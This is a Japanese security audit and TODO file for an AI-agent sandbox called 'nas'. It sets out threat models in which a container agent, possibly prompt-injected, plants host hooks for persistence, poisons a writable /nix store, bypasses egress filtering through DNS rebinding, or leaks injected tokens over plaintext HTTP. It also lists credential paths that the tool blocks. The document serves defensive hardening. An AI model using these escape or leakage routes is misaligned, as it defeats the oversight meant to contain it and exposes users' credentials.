# TODO / メモ（統合版）

nas の課題・監査記録・設計メモを 1 本化したファイル。

**2026-07-12 裏取り実施**: 全項目を現行コードに対して fact-check し、修正済みの項目を削除、
スタックした記述を訂正、残る項目に優先度（P0〜P3）を付与した。裏取り結果は各項目の `[検証]` に記す。

構成:
- §0 優先度サマリ（アクション順）★NEW
- §1 Security（脅威モデル・残課題）
- §2 既存の非セキュリティ課題
- §3 全体監査の改善点（ドキュメント/デッドウェイト/リファクタ）
- §4 セキュリティレビュー詳細記録（参照）
- §5 OTEL / history deferred フォローアップ

---

# §0. 優先度サマリ（2026-07-12 裏取り後）

凡例: **P0**=今すぐ（実害大 × 小〜中工数）/ **P1**=近いうち / **P2**=中期 / **P3**=低・設計受容

| 優先 | 項目 | 種別 | 工数 | 根拠 |
|---|---|---|---|---|
| **P0** | §3-A ドキュメント/スキルのドリフト | Docs | 小 | 現行実装に合わせて更新する |
| **P1** | H2 認証情報ディレクトリ常時 RW → host persistence | Sec | 中〜大 | Claude は認証・履歴以外を RO / session-private 化。`~/.claude.json` の MCP は managed settings で制限が必要 |
| **P1** | `/nix` RW マウント | Sec | 小〜中 | コンテナ root 奪取で store 汚染 → 他セッション RCE |
| **P1** | §3-B1 zod 削除 / §3-B3 CI 重複・抜け | Chore | 小 | 未使用依存の削除とCI修正が必要 |
| **P2** | DinD sidecar `--privileged` | Sec | 中 | |
| **P2** | workspace RO 保護の残る穴 | Sec | 小〜中 | 下記「`.git` / `.nas` の RO 保護」の残り |
| **P2** | §3-B2 migrate.ts ~1900行 整理 | Refactor | 中 | Pkl-only 宣言済み |
| **P3** | 承認画面で引数の境界と平文 request の inject 省略が見えない | UX/Sec | 小 | 下記「hostexec allowlist」「平文 HTTP」の残り |
| **P3** | L3〜L8, §3-C/D/E2-4/F 各種リファクタ・堅牢化 | 各種 | — | 下記 |

**削除済み（裏取りで修正確認）**: §2-1 addon-hash 再作成 / §2-2 pathPrefix 境界 / E1 error channel /
§5 の pricing・codex OTEL・SSE 定数・frontend history pages・seedInvocation。詳細は各節の `[検証]` 参照。

**完了（2026-09-24、develop へ merge 済み）**:
- コンテナ権限ハードニング — `security/container-hardening`
- `.git/hooks` / `.git/config` / `.nas` の RO 保護 — `security/githooks-ro`
- hostexec M8 / M9 / `fallback` 削除 — `security/hostexec-allowlist`
- hostexec M10 / M11 — `security/hostexec-secrets-env`
- DinD dockerd の loopback 化 — `security/dind-loopback`
- L1 ソケットの行サイズ上限 — `security/socket-line-limit`
- 平文 HTTP への inject 省略 — `security/inject-https-only`
- 上流 TLS の証明書検証（`--ssl-insecure` 削除）— `security/verify-upstream-tls`

**完了（2026-09-25）**:
- H5 / H6 の addon 側を develop に戻した — `security/restore-ssrf-addon`

---

# §1. Security

## Threat model

- **前提**: ユーザは信頼できないリポジトリを clone して `nas` を実行することがある。
  `.agent-sandbox.yml` / `.nix` / `.nas/config.pkl` の内容は攻撃者制御と見なす。
- **受容**:
  - 同 UID で走る host 側プロセスは既に `~/.bashrc` 等で詰んでいるため、防御しない。
  - **同一ホストの別 UID ユーザ（TCP loopback 経由）も信頼境界内とする**（2026-06-12 方針）。
    マルチユーザ dev サーバ/踏み台を対象にするなら再検討（H3 参照）。
- **防御対象**:
  1. ✅ 悪意 repo 経由の **config load 時の host code exec** — workspace-trust ゲート＋
     pkl eval サンドボックスで対策（§4 CRITICAL-2）。
  2. コンテナ内 agent → host への **escape / persistence**（H2・`/nix` RW が残）
  3. ~~共有ホストの別ユーザ (TCP loopback)~~ → H3 受容
  4. ブラウザ経由の **CSRF / DNS rebinding** (Origin guard で対策済)
  5. ✅ コンテナ内 agent → **network egress 封じ込めの突破** — IP literal と
     DNS 解決後の denied range を多層で拒否し、許可 IP へピン留めする（H5/H6）
  6. 経路上の第三者による **注入した credential の盗聴** — inject は TLS の request だけ、
     上流の証明書は検証する（2026-09-24）

## 対応状況サマリ

| 項目 | 状態 | 根拠 |
|---|---|---|
| CRITICAL-1 hostexec 自己承認バイパス | ✅ 解決 | exec/control 2ソケット分離 + 統合テスト |
| CRITICAL-2 未信頼 repo-local config → ホストRCE | ✅ 解決 | trust gate + pkl eval サンドボックス |
| HIGH-3 Web UI に帯域外トークン無し | 🟡 受容 | 「同一ホスト＝信頼境界」。CSRF/DNS rebinding は Origin/Host guard で防御済 |
| HIGH DinD egress バイパス | ✅ 解決 | 実機で内側 egress 不通・pull は allowlist 下を確認 |
| H5 DNS リバインディング SSRF | ✅ 解決 | addon の async `server_connect` で resolve→denied-IP 除外→許可 IP へピン留め（2026-09-25 に develop へ戻した） |
| H6 IP リテラル拒否リストの穴 | ✅ 解決 | TS 側（`c8b821da`）と addon 側を同じ corpus で検証 |
| 危険設定削除 (gcloud/aws/gpg) | ✅ 解決 | 型・mount 分岐・probe・Pkl schema から削除。旧設定は移行先を名指しして load 失敗 |
| H2 認証情報ディレクトリ RW | 🟡 部分解決 **P1** | Claude は設定類を RO、認証・履歴・projects を RW 共有。`~/.claude.json` の MCP 制限は managed settings が必要 |
| コンテナ権限ハードニング | ✅ 解決 | `no-new-privileges` + `cap-drop ALL`、entrypoint 用に 6 つだけ戻す |
| `.git` / `.nas` の RO 保護 | ✅ 解決（残りあり） | config・hooks・`core.hooksPath`・worktree ポインタを RO、途中のディレクトリはリネーム不可に |
| M8 / M9 / fallback | ✅ 解決 | 下記「hostexec allowlist」 |
| M10 / M11 | ✅ 解決 | 下記 |
| 平文 HTTP への inject | ✅ 解決 | addon で `scheme == "https"` のときだけ inject |
| 上流 TLS 未検証（`--ssl-insecure`） | ✅ 解決 | certifi とホスト名で検証。社内 TLS 傍受環境では 502 |
| DinD `0.0.0.0:2375` / L1 | ✅ 解決 | 下記 |
| L2〜L8 | ⬜ 残 | 下記（大半 CONFIRMED、L2 のみ STALE 訂正） |

## 修正済

- hostexec 自己承認バイパス（exec/control 2ソケット分離）— CRITICAL-1
- workspace-trust ゲート + pkl eval サンドボックス — CRITICAL-2
- DinD egress バイパス封じ込め
- H6 IP literal 拒否 — `0.0.0.0/8`・CGNAT・IPv4-mapped IPv6・unspecified/loopback/link-local を
  TS/Python の両経路で拒否
- H5 DNS リバインディング SSRF — DNS 応答の denied IP を除外し、最初の許可 IP へ接続先をピン留め
- コンテナ権限ハードニング、`.git` / `.nas` の RO 保護、hostexec M8〜M11 と `fallback` 削除、
  DinD loopback、L1、平文 HTTP への inject 省略、上流 TLS 検証（2026-09-24）
- mount: extra-mounts.src を realpath で解決（symlink escape）
- mount: extra-mounts.dst の containerWorkDir/Home 逸脱を拒否
- hostexec: 絶対パス argv0 を安全 prefix 配下に制限
- hostexec: cwd.allow entries と secrets path prefix の検証（M1 + secrets）
- dbus,config: dbus rules / source-address / pid file / nix.extra-packages 検証（M2/M7 他）
- worktree: git 呼び出しハードニング + symlink 追従 cp 回避（M3/M6）
- ui: git 呼び出しサンドボックス化 + approve/clean/rename/xdg-open 入力厳格化（H4/M4/M5）

## P0 セキュリティ

### H5/H6. network SSRF hardening — ✅ 解決（2026-09-25 に develop へ戻した）

- **経緯**: 2026-07-21 に入れた addon 側の実装が、履歴の書き換えで develop から落ちていた
  （2026-09-24 に判明）。addon が大きく変わっていたので cherry-pick せず、
  `mask-filter-backup` にあったコミットを develop の上に手で移した（`security/restore-ssrf-addon`）。
- **7 月の実装から変えた点**: ピン留めした接続は、`server_connected` で `address` を元のホスト名へ
  戻す。mitmproxy は次の request の (host, port) と接続の `address` が一致するときだけ接続を
  再利用するので、IP のままだと同じホストへの request が毎回新しい接続を張っていた。
  `Server.__setattr__` は open 中の `address` 変更を拒むので `object.__setattr__` で戻す。
  mitmproxy を上げてこの前提が崩れると、integration test の接続再利用のケースが落ちる。
- **確認したこと**: 証明書は SNI のホスト名で検証される（mitmproxy 11.1.3 は TLS の接続では
  `server_connect` より前に `sni` をホスト名にしている）。既存の上流 TLS の integration test は
  ピン留めした状態で通る。
- **影響**: 社内 API など private address の名前は、許可していても proxy 経由で届かなくなる。
  許可する設定は作っていない。
- **残り**: 拒否範囲は TS と同じで、multicast・`198.18.0.0/15`・NAT64（`64:ff9b::/96`）・
  6to4（`2002::/16`）に埋め込まれた private IPv4 は拒否しない。proxy container に IPv6 の経路が
  無いときに最初の許可 IP が IPv6 だと、IPv4 に fallback せず接続に失敗する。
- 以下は 2026-07-21 時点の記録。
- **H6**: TS は文字列 prefix ではなく IPv4/IPv6 を構造的にパースする。Python は `ipaddress` と明示 CIDR を使い、
  共有境界 corpus で `0.0.0.0/8`・CGNAT `100.64.0.0/10`・IPv4-mapped IPv6・`::`・`::1` などの
  parity を検証した。
- **H5**: mitmproxy addon の async `server_connect` で DNS を解決し、denied range の候補を除外してから
  最初の許可 IP へ `data.server.address` をピン留めする。TLS の SNI は元の論理ホスト名を維持する。
- **検証**: `src/network/ip_policy_test.ts`、`src/network/broker_integration_test.ts`、
  `src/docker/mitmproxy/nas_addon_test.ts` で境界値と mixed-answer・dedup・timeout・direct-IP・
  already-set SNI を回帰検証する。`src/docker/mitmproxy/nas_addon_integration_test.ts` では、実 mitmproxy が
  loopback に解決される名前へ接続せず 502 を返すこと、ピン留めした接続が再利用されることを検証する
  （2026-09-25 に移したテスト）。
- **2026-07-21 実行結果**: unit 2455 pass / 9 skip、broker integration 24 pass。実 mitmproxy integration は
  この検証環境で Docker が利用できず 1 skip（Docker 利用可能環境では guarded test を実行）。

### 危険で他に代替のある設定を削除 — ✅ 解決

`GcloudConfig` / `AwsConfig` / `GpgConfig` を、型・デフォルト・mount 分岐・probe・
Pkl schema から削除した。`gpgAgentSocket` probe も唯一の利用者だった mount 分岐と
一緒に消えている。旧設定を残した config は `retiredSourceErrors`（`src/config/retired.ts`）
が pkl eval 前に捕まえ、移行先（secrets + network scope / hostexec / `extraMounts` の
`mode = "ro"`）を名指しして停止する。

## P1 セキュリティ

### H2. `~/.claude` 等が常時 RW マウント → agent が hook 仕込んで host persistence
- **脅威**: in-container agent が `~/.claude/settings.json` の `PreToolUse`/`Stop` hook を書き換え、
  ユーザが次回 **host 上で直接** `claude` を起動した瞬間に host 任意コード実行。
- **🟡 部分対応（`profile.agentState.protectSettings = true`、既定 false）**:
  Claude は `~/.claude` の設定・plugins・skills・agents・commands・hooks 等を RO で共有し、
  認証・履歴・projects（auto memory を含む）だけを RW 共有する。ログ・キャッシュ・shell snapshots と
  ホストにない項目は session-private。通常起動・ACP・Dev Container で共通。
  Codex / Copilot は従来どおり実在する設定ファイルだけを RO overlay する。
- **⬜ 残る穴**:
  - **`~/.claude.json` の `mcpServers`** — 実行中の更新用に RW 共有する。
    ホスト・コンテナの両方で managed settings に `allowManagedMcpServersOnly: true` と
    `allowedMcpServers: []` を配置すれば、このファイルからの MCP 起動を拒否できる。nas は自動設定しない。
  - **workspace 内の `.claude/settings.json`・`.github/hooks/`** — `.git/hooks` は下の RO 保護で
    塞いだ（2026-09-24）が、この 2 つは RW のまま。user scope と違い当該リポジトリ限定なので
    severity は低いが未対応。
- **未検証**: コンテナ内 claude は起動時に一度 `~/.claude/settings.json` を書く（内容は同一）。
  RO 化で EROFS/EBUSY をどう扱うかは実測していない。VS Code 拡張ではエラーになったため既定を false にした。

### コンテナ権限ハードニング
- [x] agent コンテナ（`docker run`・ACP・Dev Container の Compose）に `--security-opt no-new-privileges` と
  `--cap-drop ALL` を付けた。entrypoint が root で `/etc/passwd` 編集・`chown`・`setpriv` による降格を
  するので、`CHOWN`・`DAC_OVERRIDE`・`FOWNER`・`SETUID`・`SETGID` を戻す。root の entrypoint が一般ユーザーで起動した
  初期ポート relay に `kill -0` を送るので `KILL` も要る（無いと「Initial port forwarding failed」で起動しない）
  （`src/stages/launch/hardening.ts`）。
  - 未確認: VS Code Dev Containers が `docker exec` で root の処理をする場合に他の capability が要るか。
  - ホストユーザが root だと agent も root のまま 6 つの capability だけで動く。
- `--user` / userns remap は影響範囲が大きいため今回スコープ外。
- [ ] **`/nix` が RW マウント** — [検証] CONFIRMED `src/stages/mount/stage.ts:209`（`:ro` 無し）。
  コンテナ root 奪取で `/nix/store` 汚染 → ホスト/他セッション RCE。
  **スキップ**: 無条件 RO 化は `nix develop` 等のキャッシュ書込みを壊す可能性あり。
  daemon 経由なら RO で動くはずだが edge case 未検証のため、`nix.readOnly` オプションとして別タスク化。
- [x] ~~**認証情報ディレクトリが RW・ディレクトリ丸ごと**~~ — settings 系のみ RO overlay で部分対応。残りは H2 参照。
- [x] **`.git/hooks`/`.git/config` が RW で無保護** — 解決（2026-09-24）。共有 git ディレクトリの
  `config`・`hooks`、`core.hooksPath` の先、`config.worktree`、linked worktree の `.git` ポインタを RO に
  した。hooks が無ければホストに空で作る。`mv .git` で保護を外せないよう、workspace root から保護対象
  までの途中のディレクトリ（`.nas` を含む）を自分自身に bind mount してリネーム不可にした
  （`planRenamePins`）。コンテナ内では `git config`・`git remote add`・`git push -u` が失敗する。
  **残る穴**:
  - workspace のパスが symlink を通ると、git が返す解決済みパスと一致せず `core.hooksPath` や
    worktree ポインタが保護から漏れることがある。
  - サブディレクトリに新しく作った `.git`、非 repo の workspace での `git init`、submodule の
    `.git/modules`、起動後に作られた `config.worktree` は対象外。
  - nas worktree の中の `.nas/config.pkl` は RO にならない（worktree 作成前に探すため）。その worktree
    から後で nas を起動すると、既存の trust ゲートが内容の変化を検知して再確認する。

### hostexec allowlist の穴 — ✅ 解決（2026-09-24）
- **`rule.fallback`**: 削除した。読むコードが無く、挙動は常に `"container"` だった。残した config は
  load で止まる。
- **M8**: `approval = "allow"` の argRegex ルールは、空の引数や空白を含む引数がある request を
  自動許可せず承認に回す（prompt 無効なら拒否）。引数単位マッチや `^…$` の強制は既存 config の意味を
  変えるので採らなかった。**残り**: 承認画面は引数を空白で連結して表示するので、承認する人にも
  引数の境界が見えない（CLI の `--format json` は配列で出る）。
- **M9**: bare name のルールは host PATH のコマンド名、絶対・相対パスのルールは要求どおりのパスを
  `hostCommandArgv0` で決め、承認表示・承認キー・audit・実行のすべてに同じ値を使う。

## P2 セキュリティ

### M10. secret ソースのパスガードが HOME 全域デフォルト許可の denylist — ✅ 解決（2026-09-24）
- **対応**: strict な allowlist は workspace 相対の `.env` や `/opt`・`/srv` を壊すので採らず、HOME は
  許可したまま既知の認証情報の置き場所（`~/.ssh`・`~/.gnupg`・`~/.aws`・`~/.kube`・gcloud・gh・
  git credentials・Claude/Codex のログイン・nas の state/runtime など）を拒否する。symlink を
  `realpath` で解決した後にも判定する。`cmd:` はパスを検査しないので、悪意ある config への境界ではない。
- 以下は修正前の記録。
- **[検証] CONFIRMED**: `src/hostexec/secret_store.ts:134-178`（`assertSafeSecretPath`）は denylist 方式で、
  `:148-151` が HOME/XDG_CONFIG_HOME 配下を早期 "safe" 判定 → `~/.ssh/id_rsa` が通る。deny は
  `SENSITIVE_PREFIXES`（/etc,/proc,…）・`/root`・`/var/lib` のみ。tilde 展開は
  `expandSecretPath`（`:256-265`）でガード前に適用されるが、ガード自体は denylist のまま。
- config は trust ゲート通過済みなので severity 低。defense-in-depth として allowlist 方式へ。

### M11. `inheritEnv.mode: "unsafe-inherit-all"` が nas 自身のシークレットまで露出 — ✅ 解決（2026-09-24）
- **対応**: `buildInheritedEnv` が `NAS_*` と、URL に認証情報を含む `*_proxy` を外す。`inheritEnv.keys` に
  名前を書いた変数は渡す。
- 以下は修正前の記録。
- **[検証] CONFIRMED**: `src/hostexec/broker.ts:654-658`（`buildEnv`）が `Object.assign(envVars, process.env)`。
  `NAS_*`/proxy トークンを除外するフィルタ無し。opt-in かつ "unsafe" 命名で半ば受容だが、
  **対応**: `NAS_*` / proxy 資格情報だけは除外。

### 平文 HTTP の request にも inject の header を付ける — ✅ 解決（2026-09-24）
- **実測**（mitmproxy 11.1.3）: CONNECT の中の平文 HTTP は上流にも平文で送られ、inject の header も
  付いていた。`server_conn.tls` は forward proxy の `https://` で False になるので判定に使えない。
- **対応**: addon は `flow.request.scheme == "https"` のときだけ inject する。`removeHeaders` は
  判定の前に無条件で適用する。agent の credential も同じ `injectHeaders` の経路を通る。
- **残り**: 承認カードには平文の request でも inject のプレビューが出る（実際には付かない）。
- **関連して解決**: proxy が `--ssl-insecure` で上流の証明書を検証していなかった（Envoy からの置き換え
  `d0ab8ad8` / `94153cdd` で理由なく入った）。certifi とホスト名で検証するようにした。社内の TLS 傍受
  proxy や自己署名の上流には 502 で繋がらず、回避する設定は作らない。
- 以下は修正前の記録。
- **脅威**: broker は許可した request に inject の header を注入するが、request が TLS かどうかを見ない。
  agent（またはプロンプトインジェクションで操られた agent）が、許可先へ平文の HTTP で request を送ると、
  secret を含む header（GitHub の token、`agentState.auth = "proxy"` で注入するホストの Claude の
  OAuth token など）が proxy から上流まで平文で送られる。経路上で盗聴できる者がそれを読める。
- **経路**:
  - `http://<許可先>/...` の forward proxy request。scope の `targets` に port を書いていなければ、port 80 への request も対象になる。
  - 443 番への CONNECT のトンネルの中で平文の HTTP を送る request。mitmproxy は CONNECT の後の内容が
    TLS でなければ HTTP の flow として扱い、上流にも平文でつなぐと理解している（未検証）。この場合は
    `targets` に `:443` を書いても防げない。
- **案**: addon の inject の適用を `flow.request.scheme == "https"` のときに限る。`removeHeaders` の削除は
  scheme に関係なく行う。利用者の設定した inject も平文では付かなくなるので、CHANGELOG に書く。
  broker は request の scheme を知らない（`AuthorizeRequest` に該当する項目がない）ので、判定は addon で行う。
- **最初にやること**: 443 番への CONNECT の中で平文の HTTP を送り、mitmproxy が上流へ平文でつなぐかを実測する。

### その他 P2
- [ ] **DinD サイドカーが `--privileged`** — [検証] CONFIRMED `src/docker/dind.ts:484`。rootless なら通常不要。
- [x] **L1: broker/hostexec ソケットに schema 検証・サイズ上限が無い** — 解決（2026-09-24）。
  コンテナから直接届く gateway・port-bind・network broker には元から上限があった。上限が無かった
  hostexec control ソケット（64 KiB）と CLI/UI の応答の読み込み（64 MiB）に上限をつけ、`readJsonLine` の
  上限を必須にした。不明な type の message は捨てる。
- [x] ~~**DinD sidecar の dockerd が namespace 内で `0.0.0.0:2375` に publish される**~~ — 解決（2026-09-24）。
  image の `dockerd-entrypoint.sh` が `0.0.0.0` を足していたので、`dockerd --host=tcp://127.0.0.1:2375` を
  明示し、rootlesskit の publish も `127.0.0.1` に絞った。実測では bridge gateway と slirp4netns の
  アドレスからも届いていたが、3 つとも拒否されるようになった。以下は修正前の記録。
- **DinD sidecar の dockerd が namespace 内で `0.0.0.0:2375` に publish される** —
  [検証] CONFIRMED。`rootlesskit ... -p 0.0.0.0:2375:2375/tcp`（実測した起動引数）。
  DinD の内側で起動したコンテナが sidecar の session network アドレス経由で
  Docker API 全体に到達できる（内側の alpine から `/v1.44/containers/json` で
  コンテナ一覧を取得できることを確認済み）。
  権限昇格ではなく多層防御の話である。agent は `DOCKER_HOST` で既に同じデーモンへ
  無制限にアクセスでき、到達できるようになるのは agent 自身が起動したコンテナである。
  問題になるのは agent が自分で制御していない第三者イメージを実行する場合に限られる。
  rootless デーモンの root は sidecar 内の uid 1000 に写像され、sidecar の外側の
  `--privileged` はその uid には及ばないため、ホストへの経路は実証されていない。
  対応: agent が `127.0.0.1:2375` で到達するようになったので、publish を
  `127.0.0.1:2375:2375` に絞れば内側からの経路は消える。

## 残 (Low / 設計受容)

- **L2: auth-router ソケット `0o777`** — [検証] **STALE**。`envoy_auth_router.ts` は現行ツリーに存在せず
  （mitmproxy 置換リファクタで消滅）、`0o777` chmod は source に無し。近い実体は
  `src/network/forward_port_relay.ts:139` が relay socket を **`0o666`**（world 可読書）に設定し、
  コメント `:51` が「auth-router's approach に倣う」と述べる。→ world-accessible ソケット懸念は relay に残るが
  0o777/該当ファイルは消えた。H3 受容と同方針で受容可。
- **L3: review rules / session registry が `0o644`** — [検証] CONFIRMED
  `src/stages/proxy/network_runtime_service.ts:110-116`（review rules）+ `:92`（addon copy）。
  session dirs は default umask。H3 受容と同方針で受容。
- **L4: xterm ClipboardAddon で OSC 52 クリップボード乗っ取り** — [検証] CONFIRMED
  `src/ui/frontend/src/terminal/attachTerminalSession.ts:600`（`loadAddon(new ClipboardAddon())`）。
- **L5: `src/log.ts` に秘密リダクション無し** — [検証] CONFIRMED（`:20-42` は console 素通し）。
- **L6: hostexec workspaceRoot/sessionTmpDir が `path.resolve` のみ、cwd は realpath** — [検証] CONFIRMED
  `src/hostexec/broker.ts:132-133` vs `:805-808`。symlink 混在で containment ミスマッチ → 主に**誤拒否**。
- **L7: グローバル `closeNotification()` が別グループの pending を消す** — [検証] CONFIRMED
  `src/lib/notify_utils.ts:135-140`（module-global）を hostexec `broker.ts:506` / network `broker.ts:512`
  が無条件呼び出し。並行 pending 時の UX バグ。
- **L8: tmp worktree path `nas-cherry-pick-tmp-${Date.now()}` 予測可能** — [検証] CONFIRMED
  `src/stages/worktree/git_worktree_service/cherry_pick.ts:345-350`。ただし `repoRoot/.nas/worktrees` 配下
  （world-writable `/tmp` ではない）で攻撃面は限定的。予測可能性自体は運用上必要なため修正対象外。
- **hostexec で `make`/`npm run` 等を許可するとワークスペース内ファイル書換で任意実行**（docs 記載済み残留）。
- **proxy コンテナに network broker の approve/deny ソケットが見える**（2026-09-24 受容）。proxy は network の
  runtime ディレクトリを RW でマウントしていて、`brokers/<session>/sock` に approve/deny を送れる。
  mitmproxy が乗っ取られた時点で egress の封じ込めは終わっているので、受容する。

## 2026-07-12 監査で確認して問題なしとした点（記録）

- control/exec socket 分離はサーバ側で強制（`hostexec/broker.ts:288-311`）。
- approve/deny scope は両 broker とも advertise 済み `allowedScopes` で上限制約。
- 絶対パス argv0 は安全 prefix 集合 + `.`/`..` 拒否で制約。
- `.nas/config.pkl` は RO バインドでセッション中改竄防止。
- DinD sidecar は default bridge 切断不能なら hard fail。host docker socket は未マウント。
- `nas ui`: `127.0.0.1` バインド、WS bearer token 定数時間比較、Host/Origin allowlist、strict CSP。

---

# §2. 既存の非セキュリティ課題

## ~~nas-proxy-shared の addon スクリプト変更検知~~ ✅ 実装済み（削除）

**[検証] STALE（実装済み）**: `ensureSharedProxy`（`src/stages/proxy/proxy_service.ts:68-104`）は
`nas.addon-hash` ラベル（`src/docker/nas_resources.ts:15`）で変更検知し、不一致なら stop+rm+再作成する。
ハッシュは `computeAddonHash`（`network_runtime_service.ts:95`）。単体テストあり
（`proxy_service_test.ts:226`）。→ 対応不要。

## ~~pathPrefix のセグメント境界チェック~~ ✅ 実装済み（削除）

**[検証] STALE（実装済み）**: `matchesPathPrefix`（`src/network/protocol.ts:254-260`）が境界チェック済み
（`/api` は `/apiv2` に非マッチ）。ReviewRule（`broker.ts:567-569`）と CredentialRule
（`credential_matching.ts:32-33`）両方が同ヘルパー使用。→ 対応不要。

---

# §3. 全体監査の改善点（非セキュリティ）

優先順の目安: ①ドキュメント/規約の乖離 → ②デッドウェイト削減 → ③重複・巨大ファイルのリファクタ。

## A. ドキュメント / 規約のドリフト

- [ ] **CLAUDE.md / AGENTS.md の `bun test` 記述が誤り**。
  `bun test src/` を「Unit + integration tests (integration requires Docker)」に修正し、`bun run test:unit` を追記する。
- [ ] **`skills/test-policy/SKILL.md` が Deno 時代のまま**。
  Deno API を Bun 相当（`bun:test`, `node:fs/promises`, `test.skipIf`, `bun test`）に書き換える。
- [ ] **`skills/effect-separation/SKILL.md` が実装と乖離**。
  `EffectStage<R>` → `Stage<Needs,Adds,R,E>` + `PipelineBuilder` に更新する。
  stale な `(EffectStage)` コメントを除去し、`mount/stage.ts` を現行実装に合わせる。

## B. デッドウェイト削減

- [ ] **P1: `zod` は完全未使用**。[検証] CONFIRMED。`package.json:30` に依存記載、`src/` からの import ゼロ。削除可。
- [ ] **P1: CI の重複と抜け**（`.github/workflows/ci.yml`）。[検証] CONFIRMED（3点とも）。`bun run check`
  が内部で `bun run lint` 実行（`package.json:16`）するのに別 `Lint` ステップで再実行 → 重複。
  自前 linter `lint:composed-effects`（`package.json:14`）は CI 未実行。integration/e2e は CI 未カバー。
- [ ] **P2: レガシー移行コード ~1900 行の整理**。[検証] CONFIRMED。`src/config/migrate.ts`（**791 行**）+
  `migrate_test.ts`（**1102 行**）が YAML→Pkl / Nix→Pkl 変換を保持、`nix eval --impure` シェルアウト
  （`migrate.ts:437,447,453`）含む。CHANGELOG で Pkl-only 宣言済み。CLI 配線 `src/cli/config.ts:84-91`。
  別コマンド切り出し or 削除候補。残す場合 `findYamlConfig`/`findNixConfig`（`:279`,`:313`）を 1 本化。

## C. 重複の集約（P3）

- [ ] **ランタイムディレクトリ解決が 6 重実装**。[検証] CONFIRMED（監査は 5 と記すが実際 6）。ヘルパー
  `resolveRuntimeSubdir`（`src/lib/runtime_dir.ts:10`）は maskfs のみ使用。`proxy/stage.ts:449`・
  `hostexec/stage.ts:430`・`dbus_proxy/stage.ts:297`・`display/stage.ts:146` が同ロジックをインライン再実装、
  さらに `defaultRuntimeDir`（`fs_utils.ts:132`）が `XDG_RUNTIME_DIR` 直読み。
- [ ] **エージェントアダプタの fs ヘルパー逐語コピー**。[検証] CONFIRMED。`findBinaryResolved`
  （`claude.ts:108`/`codex.ts:78`/`copilot.ts:83` byte一致）、`dirExistsSync`（`claude.ts:86`,`codex.ts:66`）、
  `fileExistsSync`/`pathExistsSync`。`src/lib/fs_utils.ts` に sync 版を足して集約。
- [ ] **UI/history の重複**。[検証] CONFIRMED（4点）。`createPollingStream`（`history_sse.ts:91`）は history のみ、
  `/api/events`（`sse.ts:21-25`）は手書き。承認検証ラダー 4回コピペ（`api.ts:~178-263`）→ `parseApprovalBody`。
  `POST /launch`（`api.ts:137-162`）だけ `withErrorHandling` を使わず手 try/catch。`App.tsx:331-336`/`358-363`
  の `onRename` closure byte 一致 → hoist。
- [ ] **ステージの identity accessor コピペ**。[検証] CONFIRMED。`resolveWorkspace`（`hostexec:449`/
  `docker_build:85`/`mount:574`）、`resolveContainerBase`（`hostexec:466`/`proxy:503`/`mount:631`）。
  `addMount` は 2 箇所でシグネチャ相違（`mount/stage.ts:638` 4引数 void push vs `hostexec/stage.ts:473`
  3引数 string 返し）→ 統一。

## D. 巨大ファイル分割 / 構造（P3）

- [x] ~~**hostexec の Python ラッパを文字列リテラルからアセットへ**~~ — 解決済み。Python ラッパ自体を
  廃止し、LD_PRELOAD ライブラリと protocol を共有する静的リンクの `nas-hostexec-client`
  （`src/hostexec/intercept/client_main.zig`）と、FD を受け取る session ごとの
  `nas-hostexec-gateway` に置き換えた。コンテナへは static client と gateway の external
  exec socket directory だけを渡し、gateway/broker の internal socket と control socket は
  host-only に保つ。埋め込み文字列も、コンテナ内の python3 依存も消えている。
- [ ] **`conversationDetailView.ts`（1078 行）分割**。[検証] CONFIRMED。ターンイベントタイムラインパーサ
  （`toTurnEventView:830`/`buildTurnEvents:893` 他）が自己完結で切り出し容易。
- [ ] **`history/store.ts`（1073 行）reader/writer 分離**。[検証] CONFIRMED（接続 `:82-171` / writer / reader
  混在）。reader を `store_reader.ts` へ（テストは `store_reader_test.ts` で境界あり）。
- [ ] **`mount/stage.ts` の `planMount`（~129-523）を独自モジュールへ**。[検証] CONFIRMED。最リスクの純関数。

## E. 型・堅牢性（P3）

- [ ] ~~パイプラインのエラーチャネルが全ステージ `unknown`~~ — [検証] **STALE（削除）**。`Stage`
  （`stage_builder.ts:36-48`）は型付き error param `E` を持ち、`PipelineBuilder.add` が `EAcc|E` を蓄積。
  channel は `Error`/`never` で `unknown` ではない。`Data.TaggedError` は `domain/session/service.ts:26` の
  **doc コメント（将来計画）**にのみ登場し、実使用ゼロ。
- [ ] **`cherryPickDetached` が nested-provide アンチパターン**。[検証] CONFIRMED（パスは
  `src/stages/worktree/git_worktree_service/cherry_pick.ts:330-386`）。`proc` 直受け + inline
  `proc.exec`/`gitExec` + `Effect.provide(makeTmpCherryPickOpsLayer(proc))`（`:370`）。
- [ ] **`display_service.ts` の silent catchAll**。[検証] CONFIRMED `:268`,`:418`
  （`catchAll(() => Effect.void)`）。`Effect.either` か `logWarning` を挟む。
- [ ] **agent registry の runtime duck-typing**。[検証] CONFIRMED `registry.ts:59-82`
  （`"claudeDirExists" in probes` 等）。`AgentProbes`（`types.ts:26`）は discriminant 無しの bare union。

## F. CLI / テスト UX（P3）

- [ ] **サブコマンド `--help` が global usage しか出さない**。[検証] CONFIRMED `src/cli.ts:137-143`。
- [ ] **`hostexec` だけ arg source が非対称**。[検証] CONFIRMED。`cli.ts:187` が `removeFirstOccurrence`
  で `--` 以降含む全 args、他は `argsBeforeDashDash`（`:160,167,174,181,192,197,209`）。潜在バグ源。
- [ ] **`nas config` が引数なしで throw**。[検証] PARTIAL。`config` 半分は CONFIRMED（`cli/config.ts:101`
  throw）だが `nas worktree` は STALE（`cli/worktree.ts:16` が undefined を `"list"` 扱い）→ config のみ usage 化。
- [ ] **CLI ハンドラの unit test 欠如**。[検証] CONFIRMED。`cli/{container,session,network,worktree,audit,
  hostexec,usage}.ts` に test 無し（`config.ts` は `config_test.ts` あり）。
- [ ] **純粋な agent テストが integration に誤分類**。[検証] CONFIRMED。`agents_integration_test.ts`
  の `configureClaude/Codex/Copilot`・`resolve*Probes` は Docker 不要 → `agents_test.ts` へ。

---

# §4. セキュリティレビュー詳細記録（2026-06-12）＋ DinD egress 設計（参照）

6 観点（Docker 隔離 / コマンドインジェクション / hostexec / Web UI / ネットワーク・プロキシ / 秘密情報・設定）で
並行レビューした記録。要点は §1 に反映済み。以下は経緯・設計詳細の保存用。

## 全体評価

設計の土台は堅実。エージェントネットワークは `internal: true` で直接 egress を遮断し allowlist 経由のみ。
config.pkl の RO 再マウント、Docker CLI 呼び出しの argv 配列徹底、hostexec の cwd 封じ込めと argv0 検証、
状態ファイルの `0700/0600` ——いずれも良く出来ている。中核防御を無効化する設計穴が当時 3 つ
